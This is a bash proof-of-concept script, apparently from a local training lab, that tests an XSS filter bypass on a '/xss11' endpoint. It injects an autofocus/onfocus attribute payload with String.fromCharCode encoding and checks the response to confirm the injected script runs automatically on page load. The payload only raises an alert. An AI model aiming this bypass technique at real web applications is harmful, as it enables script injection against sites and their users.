#!/bin/bash

# POC: Automatic XSS Execution via Autofocus and Onfocus Event Handler (Version 2)
# Target: /xss11 endpoint
# Vulnerability: XSS filter bypass allowing automatic code execution on page load

TARGET_URL="http://localhost:5000/xss11"

echo "[*] Testing Automatic XSS Execution via Autofocus and Onfocus (v2)"
echo "[*] Target: $TARGET_URL"
echo ""

# The payload that bypasses both filters:
PAYLOAD='" autofocus onfocus="alert(String.fromCharCode(88,83,83))" x="'

echo "[*] Payload: $PAYLOAD"
echo ""

# URL encode the payload for the GET request
ENCODED_PAYLOAD=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$PAYLOAD'''))")

echo "[*] Encoded payload: $ENCODED_PAYLOAD"
echo ""

# Send the request and save full response
echo "[*] Sending request..."
RESPONSE=$(curl -s "${TARGET_URL}?input=${ENCODED_PAYLOAD}")

# First, let's see what the actual response contains
echo "[*] Raw response (first 2000 chars):"
echo "$RESPONSE" | head -c 2000
echo ""
echo ""

# Save response to file for analysis
echo "$RESPONSE" > /tmp/xss11_response.html

echo "[*] Full response saved to /tmp/xss11_response.html"
echo ""

# Check if the payload made it into the HTML without being filtered
echo "[*] Checking for successful injection..."
echo ""

if echo "$RESPONSE" | grep -qi 'autofocus'; then
    echo "[+] SUCCESS: autofocus attribute found in response"
    echo "$RESPONSE" | grep -i 'autofocus' | head -1
else
    echo "[-] autofocus attribute not found (may have been filtered)"
fi

if echo "$RESPONSE" | grep -qi 'onfocus'; then
    echo "[+] SUCCESS: onfocus event handler found in response"
    echo "$RESPONSE" | grep -i 'onfocus' | head -1
else
    echo "[-] onfocus event handler not found (may have been filtered)"
fi

if echo "$RESPONSE" | grep -qi 'String.fromCharCode'; then
    echo "[+] SUCCESS: String.fromCharCode (bypass of XSS string filter) found in response"
    echo "$RESPONSE" | grep -i 'String.fromCharCode' | head -1
else
    echo "[-] String.fromCharCode not found (may have been filtered)"
fi

echo ""
echo "[*] Analysis of response:"

# Look for input elements in the response
INPUT_COUNT=$(echo "$RESPONSE" | grep -o '<input' | wc -l)
echo "    - Found $INPUT_COUNT input elements"

# Look for the injected value
if echo "$RESPONSE" | grep -q "autofocus"; then
    echo "    - Payload successfully injected into HTML"
    echo "    - autofocus + onfocus will trigger on page load"
    echo "    - Automatic XSS execution confirmed"
else
    echo "    - Payload was filtered by the endpoint"
    echo "    - Need to analyze filter behavior"
fi

echo ""